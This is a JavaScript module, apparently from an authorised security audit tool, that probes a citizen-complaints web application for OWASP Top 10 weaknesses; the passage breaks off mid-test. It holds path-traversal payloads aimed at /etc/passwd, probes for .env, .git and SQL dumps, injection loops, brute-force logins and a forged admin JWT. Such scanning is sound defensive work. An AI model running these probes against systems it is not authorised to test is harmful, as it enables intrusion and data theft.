/**
 * ═══════════════════════════════════════════════════════════════════
 * WEB APPLICATION ATTACKS MODULE - MÉDIOUNA ACTION
 * Compliance: OWASP Top 10 2021, SANS Top 25
 * ═══════════════════════════════════════════════════════════════════
 */

import axios from 'axios';
import * as cheerio from 'cheerio';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export class WebAttacksModule {
  constructor(config) {
    this.config = config;
    this.findings = [];
    this.axiosInstance = axios.create({
      timeout: config.timeout || 30000,
      maxRedirects: 5,
      validateStatus: () => true, // Ne pas throw sur les erreurs HTTP
      headers: {
        'User-Agent': 'MedAction-Security-Audit/2.0',
        'Accept': 'application/json, text/html, */*',
      },
    });
    this.tokens = {};
  }

  // ═══════════════════════════════════════════════════════════════════
  // HELPER METHODS
  // ═══════════════════════════════════════════════════════════════════

  async getToken(role) {
    if (this.tokens[role]) return this.tokens[role];
    
    const credentials = this.config.credentials[role];
    if (!credentials) return null;
    
    try {
      const response = await this.axiosInstance.post(
        `${this.config.apiBaseUrl}/auth/signin`,
        {
          email: credentials.email,
          password: credentials.password,
        }
      );
      
      if (response.status === 200 && response.data) {
        this.tokens[role] = response.data.token || response.data.accessToken || response.data.access_token;
        return this.tokens[role];
      }
    } catch (error) {
      console.error(`  ⚠️ Impossible d'obtenir le token pour ${role}: ${error.message}`);
    }
    return null;
  }

  async loadPayloads(filename) {
    try {
      const payloadsPath = path.join(__dirname, '..', 'payloads', filename);
      const content = await fs.readFile(payloadsPath, 'utf8');
      return JSON.parse(content);
    } catch (error) {
      console.warn(`  ⚠️ Impossible de charger ${filename}`);
      return [];
    }
  }

  // ═══════════════════════════════════════════════════════════════════
  // A01:2021 – BROKEN ACCESS CONTROL
  // ═══════════════════════════════════════════════════════════════════

  async brokenAccessControl() {
    console.log('  [A01] Testing Broken Access Control...');
    const findings = [];
    
    // === Test 1: Accès aux endpoints sensibles SANS authentification ===
    const sensitiveEndpoints = [
      '/api/users',
      '/api/users/me',
      '/api/users/1',
      '/api/reclamations',
      '/api/reclamations/1',
      '/api/reclamations/1/decision',
      '/api/etablissements',
      '/api/evenements',
      '/api/evenements/1',
      '/api/stats',
      '/api/stats/global',
      '/api/logs',
      '/api/admin',
      '/api/admin/users',
      '/api/config',
      '/api/system/settings',
      '/dashboard/admin',
      '/dashboard/gouverneur',
      '/dashboard/delegation',
    ];
    
    for (const endpoint of sensitiveEndpoints) {
      try {
        const response = await this.axiosInstance.get(
          `${this.config.target}${endpoint}`,
          { headers: {} } // Pas d'authentification
        );
        
        if (response.status === 200 && response.data) {
          const hasData = typeof response.data === 'object' 
            ? Object.keys(response.data).length > 0 
            : response.data.length > 0;
            
          if (hasData) {
            findings.push({
              severity: 'CRITICAL',
              category: 'Broken Access Control',
              title: `Accès non authentifié à ${endpoint}`,
              description: `L'endpoint ${endpoint} est accessible sans authentification`,
              endpoint: endpoint,
              method: 'GET',
              request: { headers: 'None' },
              response: {
                status: response.status,
                dataSnippet: JSON.stringify(response.data).substring(0, 200),
              },
              remediation: 'Implémenter un middleware d\'authentification sur cet endpoint',
              cvss: 9.1,
              cwe: 'CWE-287',
              owasp: 'A01:2021',
            });
          }
        }
      } catch (error) {
        // Attendu - bonne sécurité
      }
    }
    
    // === Test 2: Escalade de privilèges verticale (CITOYEN → ADMIN) ===
    const citoyenToken = await this.getToken('citoyen');
    
    if (citoyenToken) {
      const adminEndpoints = [
        { endpoint: '/api/reclamations/1/decision', method: 'PATCH', data: { decision: 'ACCEPTEE', motif: 'Test' } },
        { endpoint: '/api/reclamations/1/affecter', method: 'POST', data: { autoriteId: 1 } },
        { endpoint: '/api/evenements/1/valider', method: 'PATCH', data: { decision: 'PUBLIEE' } },
        { endpoint: '/api/users', method: 'GET', data: null },
        { endpoint: '/api/users/1', method: 'DELETE', data: null },
        { endpoint: '/api/stats/global', method: 'GET', data: null },
        { endpoint: '/api/system/settings', method: 'GET', data: null },
      ];
      
      for (const { endpoint, method, data } of adminEndpoints) {
        try {
          const config = {
            method: method.toLowerCase(),
            url: `${this.config.apiBaseUrl}${endpoint}`,
            headers: { Authorization: `Bearer ${citoyenToken}` },
          };
          
          if (data) config.data = data;
          
          const response = await this.axiosInstance(config);
          
          if (response.status === 200 || response.status === 201) {
            findings.push({
              severity: 'CRITICAL',
              category: 'Vertical Privilege Escalation',
              title: `CITOYEN peut accéder à l'endpoint admin: ${endpoint}`,
              description: `Un utilisateur avec le rôle CITOYEN peut exécuter des fonctions administratives`,
              endpoint: endpoint,
              method: method,
              role: 'CITOYEN',
              expectedRole: 'ADMIN/GOUVERNEUR',
              response: {
                status: response.status,
                snippet: JSON.stringify(response.data).substring(0, 200),
              },
              remediation: 'Implémenter des vérifications RBAC strictes',
              cvss: 9.8,
              cwe: 'CWE-269',
              owasp: 'A01:2021',
            });
          }
        } catch (error) {
          // Attendu - bonne sécurité
        }
      }
    }
    
    // === Test 3: Escalade de privilèges horizontale (User A → User B) ===
    if (citoyenToken) {
      // Accéder aux réclamations d'autres utilisateurs
      for (let userId = 1; userId <= 10; userId++) {
        try {
          const response = await this.axiosInstance.get(
            `${this.config.apiBaseUrl}/users/${userId}/reclamations`,
            {
              headers: { Authorization: `Bearer ${citoyenToken}` },
            }
          );
          
          if (response.status === 200 && response.data && Array.isArray(response.data) && response.data.length > 0) {
            findings.push({
              severity: 'HIGH',
              category: 'Horizontal Privilege Escalation',
              title: `Accès aux réclamations de l'utilisateur ${userId}`,
              description: `L'utilisateur peut accéder aux données d'un autre utilisateur`,
              endpoint: `/users/${userId}/reclamations`,
              method: 'GET',
              response: {
                status: response.status,
                recordCount: response.data.length,
              },
              remediation: 'Vérifier la propriété des ressources avant de les retourner',
              cvss: 7.5,
              cwe: 'CWE-639',
              owasp: 'A01:2021',
            });
            break; // Un seul exemple suffit
          }
        } catch (error) {
          // Continue
        }
      }
      
      // Accéder aux réclamations individuelles
      for (let recId = 1; recId <= 20; recId++) {
        try {
          const response = await this.axiosInstance.get(
            `${this.config.apiBaseUrl}/reclamations/${recId}`,
            {
              headers: { Authorization: `Bearer ${citoyenToken}` },
            }
          );
          
          if (response.status === 200 && response.data) {
            // Vérifier si la réclamation appartient à l'utilisateur actuel
            const ownerEmail = response.data.user?.email || response.data.citoyen?.email;
            const currentEmail = this.config.credentials.citoyen.email;
            
            if (ownerEmail && ownerEmail !== currentEmail) {
              findings.push({
                severity: 'HIGH',
                category: 'IDOR - Horizontal Privilege Escalation',
                title: `Accès non autorisé à la réclamation #${recId}`,
                description: `L'utilisateur peut accéder à une réclamation qui ne lui appartient pas`,
                endpoint: `/reclamations/${recId}`,
                method: 'GET',
                actualOwner: ownerEmail,
                currentUser: currentEmail,
                response: {
                  status: response.status,
                  hasData: true,
                },
                remediation: 'Vérifier la propriété des ressources côté serveur',
                cvss: 7.5,
                cwe: 'CWE-639',
                owasp: 'A01:2021',
              });
              break; // Un seul exemple suffit
            }
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    // === Test 4: Forced Browsing (chemins cachés) ===
    const hiddenPaths = [
      '/.git',
      '/.git/config',
      '/.env',
      '/.env.local',
      '/.env.production',
      '/api/.env',
      '/api/config',
      '/api/debug',
      '/api/logs',
      '/api/backup',
      '/api/test',
      '/admin',
      '/administrator',
      '/phpmyadmin',
      '/adminer',
      '/backup.sql',
      '/database.sql',
      '/dump.sql',
      '/prisma/schema.prisma',
      '/package.json',
      '/package-lock.json',
      '/next.config.js',
      '/server.js',
      '/_next/static/chunks/app-internals.js',
    ];
    
    for (const hiddenPath of hiddenPaths) {
      try {
        const response = await this.axiosInstance.get(
          `${this.config.target}${hiddenPath}`
        );
        
        if (response.status === 200) {
          const isSensitive = 
            hiddenPath.includes('.git') ||
            hiddenPath.includes('.env') ||
            hiddenPath.includes('config') ||
            hiddenPath.includes('backup') ||
            hiddenPath.includes('.sql');
          
          findings.push({
            severity: isSensitive ? 'CRITICAL' : 'HIGH',
            category: 'Forced Browsing',
            title: `Chemin caché accessible: ${hiddenPath}`,
            description: `Le chemin ${hiddenPath} est accessible sans restrictions`,
            endpoint: hiddenPath,
            method: 'GET',
            response: {
              status: response.status,
              contentLength: typeof response.data === 'string' ? response.data.length : JSON.stringify(response.data).length,
            },
            remediation: 'Bloquer l\'accès aux chemins administratifs et fichiers sensibles',
            cvss: isSensitive ? 8.5 : 6.5,
            cwe: 'CWE-425',
            owasp: 'A01:2021',
          });
        }
      } catch (error) {
        // Attendu
      }
    }
    
    // === Test 5: Path Traversal ===
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system.ini',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '/etc/passwd',
      'C:\\windows\\system.ini',
      '..%c0%af..%c0%af..%c0%afetc/passwd',
    ];
    
    const fileEndpoints = ['/api/files/', '/api/download/', '/uploads/', '/static/'];
    
    for (const endpoint of fileEndpoints) {
      for (const payload of pathTraversalPayloads) {
        try {
          const response = await this.axiosInstance.get(
            `${this.config.target}${endpoint}${encodeURIComponent(payload)}`
          );
          
          const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          
          if (
            responseText.includes('root:') ||
            responseText.includes('[boot loader]') ||
            responseText.includes('for 16-bit app support')
          ) {
            findings.push({
              severity: 'CRITICAL',
              category: 'Path Traversal',
              title: `Path Traversal via ${endpoint}`,
              description: `Accès au système de fichiers via payload: ${payload}`,
              endpoint: `${endpoint}${payload}`,
              method: 'GET',
              payload: payload,
              response: {
                status: response.status,
                snippet: responseText.substring(0, 100),
              },
              remediation: 'Valider et sanitizer les chemins de fichiers, utiliser une whitelist',
              cvss: 9.3,
              cwe: 'CWE-22',
              owasp: 'A01:2021',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // A02:2021 – CRYPTOGRAPHIC FAILURES
  // ═══════════════════════════════════════════════════════════════════

  async cryptoFailures() {
    console.log('  [A02] Testing Cryptographic Failures...');
    const findings = [];
    
    // === Test 1: HTTP au lieu de HTTPS ===
    if (this.config.target.startsWith('http://')) {
      findings.push({
        severity: 'HIGH',
        category: 'Cryptographic Failures',
        title: 'Application servie via HTTP non chiffré',
        description: 'L\'application est accessible via le protocole HTTP non sécurisé',
        endpoint: this.config.target,
        method: 'N/A',
        remediation: 'Activer HTTPS et rediriger tout le trafic HTTP vers HTTPS',
        cvss: 7.4,
        cwe: 'CWE-319',
        owasp: 'A02:2021',
      });
    }
    
    // === Test 2: Données sensibles dans les URL ===
    try {
      const response = await this.axiosInstance.get(`${this.config.target}/login`);
      const html = response.data;
      
      if (typeof html === 'string') {
        const $ = cheerio.load(html);
        
        // Formulaires avec méthode GET pour données sensibles
        $('form[method="get"], form:not([method])').each((i, form) => {
          const action = $(form).attr('action') || '';
          const inputs = $(form).find('input');
          
          inputs.each((j, input) => {
            const name = $(input).attr('name') || '';
            const type = $(input).attr('type') || '';
            
            if (['password', 'token', 'secret', 'api_key', 'apikey'].includes(name.toLowerCase()) || type === 'password') {
              findings.push({
                severity: 'MEDIUM',
                category: 'Cryptographic Failures',
                title: `Champ sensible "${name}" dans formulaire GET`,
                description: `Le formulaire ${action} utilise GET pour un champ sensible`,
                endpoint: action,
                method: 'GET',
                fieldName: name,
                remediation: 'Utiliser POST pour les formulaires avec données sensibles',
                cvss: 5.3,
                cwe: 'CWE-598',
                owasp: 'A02:2021',
              });
            }
          });
        });
      }
    } catch (error) {
      // Continue
    }
    
    // === Test 3: Politique de mot de passe faible ===
    const weakPasswords = ['123456', 'password', 'admin123', '12345678', 'user123', 'test'];
    
    for (const weakPass of weakPasswords) {
      try {
        const response = await this.axiosInstance.post(
          `${this.config.apiBaseUrl}/auth/register`,
          {
            nom: 'Test',
            prenom: 'User',
            email: `test${Date.now()}@example.com`,
            motDePasse: weakPass,
            confirmPassword: weakPass,
            telephone: '0600000000',
          }
        );
        
        if (response.status === 200 || response.status === 201) {
          findings.push({
            severity: 'MEDIUM',
            category: 'Weak Password Policy',
            title: `Mot de passe faible accepté: "${weakPass}"`,
            description: 'Le système accepte des mots de passe qui ne respectent pas les exigences de complexité',
            endpoint: '/auth/register',
            method: 'POST',
            password: weakPass,
            remediation: 'Implémenter une politique de mot de passe forte (min 8 caractères, majuscules, chiffres, symboles)',
            cvss: 5.0,
            cwe: 'CWE-521',
            owasp: 'A02:2021',
          });
          break; // Un seul exemple suffit
        }
      } catch (error) {
        // Attendu - bonne sécurité
      }
    }
    
    // === Test 4: JWT Secret faible ===
    const citoyenToken = await this.getToken('citoyen');
    
    if (citoyenToken) {
      const commonSecrets = [
        'secret',
        'jwt-secret',
        'mysecret',
        '12345678',
        'password',
        'your-256-bit-secret',
        'your-secret-key',
        'changeme',
        'development',
      ];
      
      // Tenter de décoder le JWT et vérifier avec des secrets communs
      const parts = citoyenToken.split('.');
      if (parts.length === 3) {
        try {
          const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
          
          // Si on peut décoder le payload, vérifier les claims sensibles
          if (payload.email || payload.role || payload.userId) {
            // Note: En réalité, il faudrait utiliser une bibliothèque JWT pour vérifier
            // la signature avec chaque secret commun
            findings.push({
              severity: 'INFO',
              category: 'JWT Analysis',
              title: 'JWT Token analysé',
              description: `Token contient: ${Object.keys(payload).join(', ')}`,
              endpoint: 'N/A',
              method: 'N/A',
              tokenPayload: payload,
              remediation: 'Vérifier que le secret JWT est fort et unique',
              cvss: 0,
              cwe: 'CWE-327',
              owasp: 'A02:2021',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // A03:2021 – INJECTION
  // ═══════════════════════════════════════════════════════════════════

  async injectionTests() {
    console.log('  [A03] Testing Injection Attacks...');
    const findings = [];
    
    // Charger les payloads
    const sqlPayloads = await this.loadPayloads('sql-injection.json');
    const xssPayloads = await this.loadPayloads('xss-payloads.json');
    const nosqlPayloads = await this.loadPayloads('nosql-injection.json');
    
    // === Test 1: SQL Injection ===
    const sqlEndpoints = [
      { endpoint: '/api/auth/signin', method: 'POST', field: 'email' },
      { endpoint: '/api/etablissements', method: 'GET', field: 'search' },
      { endpoint: '/api/reclamations', method: 'GET', field: 'communeId' },
      { endpoint: '/api/users', method: 'GET', field: 'email' },
    ];
    
    const topSqlPayloads = sqlPayloads.slice(0, 50);
    
    for (const { endpoint, method, field } of sqlEndpoints) {
      for (const payload of topSqlPayloads) {
        try {
          let response;
          
          if (method === 'POST') {
            response = await this.axiosInstance.post(
              `${this.config.apiBaseUrl}${endpoint}`,
              { [field]: payload, password: 'test' }
            );
          } else {
            response = await this.axiosInstance.get(
              `${this.config.apiBaseUrl}${endpoint}`,
              { params: { [field]: payload } }
            );
          }
          
          const responseText = JSON.stringify(response.data);
          
          // Vérifier les messages d'erreur SQL
          const sqlErrors = [
            'SQL syntax',
            'mysql_fetch',
            'PostgreSQL',
            'SQLSTATE',
            'sqlite_',
            'pg_query',
            'Unclosed quotation',
            'syntax error',
            'ORA-',
            'DB2 SQL',
            'ODBC',
            'unterminated',
          ];
          
          for (const errorMsg of sqlErrors) {
            if (responseText.toLowerCase().includes(errorMsg.toLowerCase())) {
              findings.push({
                severity: 'CRITICAL',
                category: 'SQL Injection',
                title: `SQL Injection dans ${endpoint}`,
                description: `Message d'erreur SQL détecté: "${errorMsg}"`,
                endpoint: endpoint,
                method: method,
                field: field,
                payload: payload,
                response: {
                  status: response.status,
                  errorSnippet: responseText.substring(0, 300),
                },
                remediation: 'Utiliser des requêtes paramétrées (Prisma protège par défaut)',
                cvss: 9.8,
                cwe: 'CWE-89',
                owasp: 'A03:2021',
              });
              break;
            }
          }
          
          // Test Time-based Blind SQL Injection
          if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
            const startTime = Date.now();
            await this.axiosInstance.post(
              `${this.config.apiBaseUrl}${endpoint}`,
              { [field]: payload }
            );
            const endTime = Date.now();
            
            if (endTime - startTime > 4500) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Blind SQL Injection',
                title: `Time-based SQL Injection dans ${endpoint}`,
                description: `Réponse retardée de ${endTime - startTime}ms avec payload SLEEP`,
                endpoint: endpoint,
                method: method,
                field: field,
                payload: payload,
                responseTime: `${endTime - startTime}ms`,
                remediation: 'Utiliser un ORM (Prisma) et éviter les requêtes SQL brutes',
                cvss: 9.3,
                cwe: 'CWE-89',
                owasp: 'A03:2021',
              });
            }
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    // === Test 2: NoSQL Injection (Prisma) ===
    const nosqlEndpoints = [
      { endpoint: '/api/users', method: 'GET', param: 'email' },
      { endpoint: '/api/reclamations', method: 'GET', param: 'userId' },
      { endpoint: '/api/auth/signin', method: 'POST', param: 'email' },
    ];
    
    for (const { endpoint, method, param } of nosqlEndpoints) {
      for (const payload of nosqlPayloads.slice(0, 20)) {
        try {
          let response;
          
          if (method === 'POST') {
            response = await this.axiosInstance.post(
              `${this.config.apiBaseUrl}${endpoint}`,
              { [param]: payload, password: 'test' }
            );
          } else {
            response = await this.axiosInstance.get(
              `${this.config.apiBaseUrl}${endpoint}`,
              { params: { [param]: typeof payload === 'string' ? payload : JSON.stringify(payload) } }
            );
          }
          
          // Vérifier si le payload a contourné le filtre
          if (response.status === 200 && response.data) {
            if (Array.isArray(response.data) && response.data.length > 100) {
              findings.push({
                severity: 'HIGH',
                category: 'NoSQL Injection',
                title: `NoSQL Injection dans ${endpoint}`,
                description: `Payload a retourné ${response.data.length} enregistrements (bypass de filtre possible)`,
                endpoint: endpoint,
                method: method,
                param: param,
                payload: payload,
                response: {
                  status: response.status,
                  recordCount: response.data.length,
                },
                remediation: 'Sanitizer les entrées utilisateur et utiliser les query builders Prisma',
                cvss: 8.6,
                cwe: 'CWE-943',
                owasp: 'A03:2021',
              });
            }
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    // === Test 3: XSS (Cross-Site Scripting) ===
    const xssEndpoints = [
      { endpoint: '/api/reclamations', method: 'POST', field: 'titre', type: 'stored' },
      { endpoint: '/api/reclamations', method: 'POST', field: 'description', type: 'stored' },
      { endpoint: '/api/evaluations', method: 'POST', field: 'commentaire', type: 'stored' },
      { endpoint: '/api/etablissements', method: 'GET', field: 'search', type: 'reflected' },
    ];
    
    const token = await this.getToken('citoyen');
    const topXssPayloads = xssPayloads.slice(0, 30);
    
    for (const { endpoint, method, field, type } of xssEndpoints) {
      for (const payload of topXssPayloads) {
        try {
          let response;
          const headers = token ? { Authorization: `Bearer ${token}` } : {};
          
          if (method === 'POST') {
            response = await this.axiosInstance.post(
              `${this.config.apiBaseUrl}${endpoint}`,
              { 
                [field]: payload,
                // Champs requis pour les réclamations
                categorie: 'INFRASTRUCTURE',
                communeId: 1,
                latitude: 33.5731,
                longitude: -7.5898,
                // Champs requis pour les évaluations
                etablissementId: 1,
                noteGlobale: 3,
              },
              { headers }
            );
          } else {
            response = await this.axiosInstance.get(
              `${this.config.apiBaseUrl}${endpoint}`,
              { params: { [field]: payload }, headers }
            );
          }
          
          const responseText = response.data ? JSON.stringify(response.data) : '';
          
          // Vérifier si le payload est reflété/stocké sans sanitization
          if (
            responseText.includes(payload) ||
            responseText.includes('<script>') ||
            responseText.includes('onerror=') ||
            responseText.includes('javascript:') ||
            responseText.includes('onload=')
          ) {
            findings.push({
              severity: type === 'stored' ? 'HIGH' : 'MEDIUM',
              category: type === 'stored' ? 'Stored XSS' : 'Reflected XSS',
              title: `XSS (${type}) dans ${endpoint} (${field})`,
              description: `Le payload est ${type === 'stored' ? 'stocké' : 'reflété'} sans sanitization`,
              endpoint: endpoint,
              method: method,
              field: field,
              payload: payload,
              type: type,
              response: {
                status: response.status,
                reflected: true,
              },
              remediation: 'Implémenter la validation des entrées et l\'encodage des sorties (CSP headers)',
              cvss: type === 'stored' ? 9.0 : 7.1,
              cwe: 'CWE-79',
              owasp: 'A03:2021',
            });
            break; // Un seul exemple par endpoint suffit
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // A05:2021 – SECURITY MISCONFIGURATION
  // ═══════════════════════════════════════════════════════════════════

  async securityMisconfig() {
    console.log('  [A05] Testing Security Misconfiguration...');
    const findings = [];
    
    // === Test 1: HTTP Security Headers ===
    try {
      const response = await this.axiosInstance.get(this.config.target);
      const headers = response.headers;
      
      const requiredHeaders = {
        'strict-transport-security': {
          severity: 'HIGH',
          recommendation: 'max-age=31536000; includeSubDomains; preload',
          description: 'Protection contre les attaques man-in-the-middle',
        },
        'x-frame-options': {
          severity: 'MEDIUM',
          recommendation: 'DENY ou SAMEORIGIN',
          description: 'Protection contre le clickjacking',
        },
        'x-content-type-options': {
          severity: 'MEDIUM',
          recommendation: 'nosniff',
          description: 'Empêche le MIME type sniffing',
        },
        'content-security-policy': {
          severity: 'HIGH',
          recommendation: "default-src 'self'; script-src 'self'",
          description: 'Prévient XSS et injection de code',
        },
        'x-xss-protection': {
          severity: 'LOW',
          recommendation: '1; mode=block',
          description: 'Protection XSS legacy',
        },
        'referrer-policy': {
          severity: 'LOW',
          recommendation: 'strict-origin-when-cross-origin',
          description: 'Contrôle les informations de référent',
        },
        'permissions-policy': {
          severity: 'LOW',
          recommendation: 'geolocation=(), microphone=()',
          description: 'Contrôle les permissions du navigateur',
        },
      };
      
      for (const [header, config] of Object.entries(requiredHeaders)) {
        if (!headers[header]) {
          findings.push({
            severity: config.severity,
            category: 'Missing Security Header',
            title: `Header manquant: ${header}`,
            description: `Le header de sécurité "${header}" n'est pas présent. ${config.description}`,
            endpoint: this.config.target,
            method: 'GET',
            missingHeader: header,
            recommendation: config.recommendation,
            remediation: `Ajouter "${header}: ${config.recommendation}" dans next.config.js`,
            cvss: config.severity === 'HIGH' ? 6.5 : config.severity === 'MEDIUM' ? 4.0 : 2.0,
            cwe: 'CWE-16',
            owasp: 'A05:2021',
          });
        }
      }
      
      // Headers d'information à supprimer
      const dangerousHeaders = ['x-powered-by', 'server', 'x-aspnet-version'];
      
      for (const header of dangerousHeaders) {
        if (headers[header]) {
          findings.push({
            severity: 'LOW',
            category: 'Information Disclosure',
            title: `Header informatif: ${header}`,
            description: `Le header révèle la technologie serveur: ${headers[header]}`,
            endpoint: this.config.target,
            method: 'GET',
            header: header,
            value: headers[header],
            remediation: 'Supprimer ou masquer les headers de technologie',
            cvss: 3.1,
            cwe: 'CWE-200',
            owasp: 'A05:2021',
          });
        }
      }
    } catch (error) {
      // Continue
    }
    
    // === Test 2: CORS Misconfiguration ===
    try {
      const response = await this.axiosInstance.get(this.config.apiBaseUrl, {
        headers: {
          Origin: 'https://evil-attacker.com',
        },
      });
      
      const corsHeader = response.headers['access-control-allow-origin'];
      
      if (corsHeader === '*') {
        findings.push({
          severity: 'HIGH',
          category: 'CORS Misconfiguration',
          title: 'Politique CORS wildcard',
          description: 'L\'API accepte les requêtes de n\'importe quelle origine (Access-Control-Allow-Origin: *)',
          endpoint: this.config.apiBaseUrl,
          method: 'GET',
          header: 'Access-Control-Allow-Origin',
          value: corsHeader,
          remediation: 'Restreindre CORS aux origines de confiance uniquement',
          cvss: 7.5,
          cwe: 'CWE-942',
          owasp: 'A05:2021',
        });
      } else if (corsHeader === 'https://evil-attacker.com') {
        findings.push({
          severity: 'CRITICAL',
          category: 'CORS Misconfiguration',
          title: 'CORS reflète origine arbitraire',
          description: 'L\'API reflète l\'origine attaquante sans validation',
          endpoint: this.config.apiBaseUrl,
          method: 'GET',
          header: 'Access-Control-Allow-Origin',
          value: corsHeader,
          remediation: 'Valider l\'origine contre une whitelist avant de la refléter',
          cvss: 8.8,
          cwe: 'CWE-942',
          owasp: 'A05:2021',
        });
      }
    } catch (error) {
      // Continue
    }
    
    // === Test 3: Verbose Error Messages ===
    try {
      const response = await this.axiosInstance.get(
        `${this.config.apiBaseUrl}/nonexistent-endpoint-999999`
      );
      
      const responseText = JSON.stringify(response.data);
      
      const sensitivePatterns = [
        { pattern: /\/Users\/[^\/]+\//gi, name: 'MacOS file path' },
        { pattern: /C:\\Users\\[^\\]+\\/gi, name: 'Windows file path' },
        { pattern: /\/var\/www\//gi, name: 'Linux web path' },
        { pattern: /\/home\/[^\/]+\//gi, name: 'Linux home path' },
        { pattern: /at .+ \([^)]+:\d+:\d+\)/gi, name: 'Stack trace' },
        { pattern: /prisma/gi, name: 'Database ORM' },
        { pattern: /postgres/gi, name: 'Database type' },
        { pattern: /mongodb/gi, name: 'Database type' },
        { pattern: /Stack trace:/gi, name: 'Stack trace' },
        { pattern: /Error: /gi, name: 'Error details' },
      ];
      
      for (const { pattern, name } of sensitivePatterns) {
        if (pattern.test(responseText)) {
          findings.push({
            severity: 'MEDIUM',
            category: 'Verbose Error Messages',
            title: `Information sensible dans erreur: ${name}`,
            description: 'Les messages d\'erreur révèlent des informations système internes',
            endpoint: '/nonexistent-endpoint-999999',
            method: 'GET',
            patternMatched: pattern.source,
            snippet: responseText.substring(0, 300),
            remediation: 'Implémenter un gestionnaire d\'erreurs personnalisé qui masque les détails internes',
            cvss: 5.3,
            cwe: 'CWE-209',
            owasp: 'A05:2021',
          });
          break;
        }
      }
    } catch (error) {
      // Continue
    }
    
    // === Test 4: HTTP Methods non nécessaires ===
    try {
      const response = await this.axiosInstance.options(this.config.apiBaseUrl);
      const allowedMethods = response.headers['allow'] || response.headers['access-control-allow-methods'] || '';
      
      const dangerousMethods = ['TRACE', 'TRACK', 'CONNECT'];
      
      for (const method of dangerousMethods) {
        if (allowedMethods.toUpperCase().includes(method)) {
          findings.push({
            severity: 'LOW',
            category: 'Unnecessary HTTP Methods',
            title: `Méthode HTTP ${method} activée`,
            description: `La méthode potentiellement dangereuse ${method} est autorisée`,
            endpoint: this.config.apiBaseUrl,
            method: 'OPTIONS',
            allowedMethods: allowedMethods,
            remediation: 'Désactiver les méthodes HTTP non nécessaires',
            cvss: 4.3,
            cwe: 'CWE-650',
            owasp: 'A05:2021',
          });
        }
      }
    } catch (error) {
      // Continue
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // A07:2021 – AUTHENTICATION FAILURES
  // ═══════════════════════════════════════════════════════════════════

  async authFailures() {
    console.log('  [A07] Testing Authentication Failures...');
    const findings = [];
    
    // === Test 1: Brute Force Protection ===
    const bruteForceAttempts = 20;
    let successfulAttempts = 0;
    
    try {
      for (let i = 0; i < bruteForceAttempts; i++) {
        const response = await this.axiosInstance.post(
          `${this.config.apiBaseUrl}/auth/signin`,
          {
            email: this.config.credentials.citoyen?.email || 'test@example.com',
            password: `WrongPassword${i}!`,
          }
        );
        
        if (response.status !== 429) {
          successfulAttempts++;
        } else {
          break; // Rate limit déclenché
        }
        
        // Petite pause pour ne pas surcharger
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      if (successfulAttempts >= bruteForceAttempts - 2) {
        findings.push({
          severity: 'HIGH',
          category: 'Brute Force Vulnerability',
          title: 'Pas de protection brute force sur login',
          description: `${successfulAttempts} tentatives de connexion échouées acceptées sans blocage`,
          endpoint: '/auth/signin',
          method: 'POST',
          attemptsSent: bruteForceAttempts,
          attemptsPassed: successfulAttempts,
          remediation: 'Implémenter un rate limiting et verrouillage de compte après N échecs',
          cvss: 7.5,
          cwe: 'CWE-307',
          owasp: 'A07:2021',
        });
      }
    } catch (error) {
      // Continue
    }
    
    // === Test 2: Session Fixation ===
    try {
      // Obtenir une session initiale
      const response1 = await this.axiosInstance.get(this.config.target);
      const initialCookie = response1.headers['set-cookie'];
      
      if (initialCookie) {
        // Login avec la session fixée
        const loginResponse = await this.axiosInstance.post(
          `${this.config.apiBaseUrl}/auth/signin`,
          {
            email: this.config.credentials.citoyen?.email,
            password: this.config.credentials.citoyen?.password,
          },
          {
            headers: {
              Cookie: initialCookie.join('; '),
            },
          }
        );
        
        const afterLoginCookie = loginResponse.headers['set-cookie'];
        
        // Vérifier si le session ID a changé
        if (initialCookie && afterLoginCookie) {
          const getSessionId = (cookies) => {
            const sessionCookie = cookies.find(c => c.includes('session') || c.includes('next-auth'));
            return sessionCookie ? sessionCookie.split(';')[0] : null;
          };
          
          const initialSession = getSessionId(initialCookie);
          const afterSession = getSessionId(afterLoginCookie);
          
          if (initialSession && afterSession && initialSession === afterSession) {
            findings.push({
              severity: 'MEDIUM',
              category: 'Session Fixation',
              title: 'Session ID non régénéré après login',
              description: 'L\'identifiant de session reste le même avant et après l\'authentification',
              endpoint: '/auth/signin',
              method: 'POST',
              initialSession: initialSession.substring(0, 50),
              afterLoginSession: afterSession.substring(0, 50),
              remediation: 'Régénérer l\'identifiant de session après authentification réussie',
              cvss: 6.5,
              cwe: 'CWE-384',
              owasp: 'A07:2021',
            });
          }
        }
      }
    } catch (error) {
      // Continue
    }
    
    // === Test 3: JWT Token Tampering ===
    const validToken = await this.getToken('citoyen');
    
    if (validToken) {
      const parts = validToken.split('.');
      
      if (parts.length === 3) {
        // Test: Token modifié (payload tampered)
        try {
          const tamperedPayload = Buffer.from(
            JSON.stringify({ role: 'ADMIN', email: 'hacker@evil.com' })
          ).toString('base64').replace(/=/g, '');
          const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;
          
          const response = await this.axiosInstance.get(
            `${this.config.apiBaseUrl}/users/me`,
            {
              headers: { Authorization: `Bearer ${tamperedToken}` },
            }
          );
          
          if (response.status === 200 && response.data) {
            findings.push({
              severity: 'CRITICAL',
              category: 'JWT Token Validation Bypass',
              title: 'JWT modifié accepté par le serveur',
              description: 'Le serveur accepte des JWT avec payload modifié',
